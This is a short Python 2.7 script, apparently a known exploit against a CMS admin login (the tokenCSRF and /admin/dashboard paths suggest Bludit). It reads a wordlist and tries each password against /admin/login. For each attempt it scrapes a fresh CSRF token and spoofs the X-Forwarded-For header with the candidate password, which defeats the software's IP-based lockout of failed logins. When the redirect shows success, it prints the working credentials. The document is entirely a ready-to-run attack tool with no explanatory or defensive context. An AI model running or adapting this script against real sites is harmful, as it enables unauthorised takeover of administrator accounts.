import re
import requests
###############################################################################
print('Only Use With Python 2.7')
print('Enter the URL as : http://x.x.x.x')
print("Please non't add a / at the end")
###############################################################################
host = raw_input('Enter the URL : ')
login_url = host + '/admin/login'
username = raw_input('Enter the username : ')
fname = raw_input('Enter the wordlist directory : ')
###############################################################################
with open(fname) as f:
    content = f.readlines()
    word1 = [x.strip() for x in content]
    wordlist = word1
for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search(
        'input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
    print('[*] Trying: {p}'.format(p=password))
###############################################################################
    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11 Linux x86_64)',
        'Referer': login_url}
###############################################################################

    data = {'tokenCSRF': csrf_token,
            'username': username,
            'password': password,
            'save': ''}
###############################################################################
    login_result = session.post(
        login_url, headers=headers, data=data, allow_redirects=False)
###############################################################################
    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print("Username : {u} ".format(u=username))
            print("Password : {p} ".format(p=password))
            break
